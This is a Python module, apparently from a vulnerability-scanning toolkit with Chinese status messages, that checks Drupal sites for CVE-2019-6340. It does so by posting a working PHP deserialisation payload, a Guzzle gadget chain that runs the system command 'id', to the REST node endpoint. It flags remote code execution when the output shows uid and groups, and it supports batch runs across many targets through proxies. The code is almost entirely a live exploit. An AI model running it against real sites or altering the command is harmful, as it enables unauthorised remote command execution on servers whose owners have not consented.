#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2019_6340:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,baseurl):
        url2 = baseurl + '/node/?_format=hal_json'
        data = {
  "link": [
    {
      "value": "link",
      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
    }
  ],
  "_links": {
    "type": {
      "href": f"{baseurl}/rest/type/shortcut/default"
    }
  }
}
        try:
            r = requests.post(url2,verify=self.verify,proxies=self.proxy,headers=self.header,json=data)
            # check = requests.get(baseurl + '/hello.txt', verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in r.text and "groups=" in r.text:
                OutPrintInfoSuc("Drupal", f"存在Drupal CVE-2019-6340 RCE漏洞: {url2}")
                # print(r.text)
                if not self.batch:
                    OutPrintInfo("Drupal", f"响应:\n{r.text.strip()}")
                else:
                    OutPutFile("drupal_2019_6340.txt",f"存在Drupal CVE-2019-6340 RCE漏洞: {url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Drupal", f"目标不存在Drupal CVE-2019-6340 RCE")


        except Exception:
            if not self.batch:
                OutPrintInfo("Drupal", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Drupal", "开始检测Drupal CVE-2019-6340 RCE...")
        self.send_payload(baseurl)
        if not self.batch:
            OutPrintInfo("Drupal", "Drupal CVE-2019-6340 RCE检测结束")



